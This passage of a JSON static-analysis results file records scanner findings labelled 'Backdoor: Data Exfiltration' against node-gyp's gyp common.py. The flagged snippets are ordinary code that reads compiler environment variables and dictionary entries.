                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 525,
                  "startColumn": 5,
                  "endLine": 525,
                  "endColumn": 10,
                  "snippet": {
                    "text": "        \"mac\": \"mac\",\n        \"ios\": \"mac\",\n        \"win\": \"win\",\n    }.get(flavor, None)\n    if not prefix:\n        return\n\n",
                    "rendered": {
                      "text": "        \"mac\": \"mac\",\n        \"ios\": \"mac\",\n        \"win\": \"win\",\n    }.get(flavor, None)\n    if not prefix:\n        return\n\n",
                      "markdown": "`        \"mac\": \"mac\",\n        \"ios\": \"mac\",\n        \"win\": \"win\",\n    }.get(flavor, None)\n    if not prefix:\n        return\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 441,
                  "startColumn": 33,
                  "endLine": 441,
                  "endColumn": 38,
                  "snippet": {
                    "text": "            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n",
                    "rendered": {
                      "text": "            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n",
                      "markdown": "`            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 58,
                  "endLine": 439,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                    "rendered": {
                      "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                      "markdown": "`        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 26,
                  "endLine": 439,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                    "rendered": {
                      "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                      "markdown": "`        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 31,
                  "endLine": 437,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n",
                    "rendered": {
                      "text": "\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n",
                      "markdown": "`\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 54,
                  "endLine": 435,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                    "rendered": {
                      "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                      "markdown": "`    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 23,
                  "endLine": 435,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                    "rendered": {
                      "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                      "markdown": "`    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 31,
                  "endLine": 312,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n\n",
                    "rendered": {
                      "text": "        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n\n",
                      "markdown": "`        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 31,
                  "endLine": 311,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        dependencies.add(r)\n        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n",
                    "rendered": {
                      "text": "        dependencies.add(r)\n        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n",
                      "markdown": "`        dependencies.add(r)\n        # Add its children.\n        spec = target_dicts[r]\n        pending.update(set(spec.get(\"dependencies\", [])))\n        pending.update(set(spec.get(\"dependencies_original\", [])))\n    return list(dependencies - set(roots))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 699,
                  "startColumn": 14,
                  "endLine": 699,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n",
                      "markdown": "`        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 698,
                  "startColumn": 14,
                  "endLine": 698,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n",
                      "markdown": "`        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 697,
                  "startColumn": 14,
                  "endLine": 697,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n",
                      "markdown": "`        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 696,
                  "startColumn": 14,
                  "endLine": 696,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n",
                    "rendered": {
                      "text": "        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n",
                      "markdown": "`        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 695,
                  "startColumn": 14,
                  "endLine": 695,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n",
                    "rendered": {
                      "text": "    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n",
                      "markdown": "`    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 694,
                  "startColumn": 14,
                  "endLine": 694,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n",
                    "rendered": {
                      "text": "    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n",
                      "markdown": "`    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 693,
                  "startColumn": 11,
                  "endLine": 693,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n",
                    "rendered": {
                      "text": "    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n",
                      "markdown": "`    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 441,
                  "startColumn": 26,
                  "endLine": 441,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n",
                    "rendered": {
                      "text": "            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n",
                      "markdown": "`            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 19,
                  "endLine": 439,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                    "rendered": {
                      "text": "        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n",
                      "markdown": "`        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 24,
                  "endLine": 437,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n",
                    "rendered": {
                      "text": "\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n",
                      "markdown": "`\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 16,
                  "endLine": 435,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    def replace_sep(s):\n        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n",
                    "rendered": {
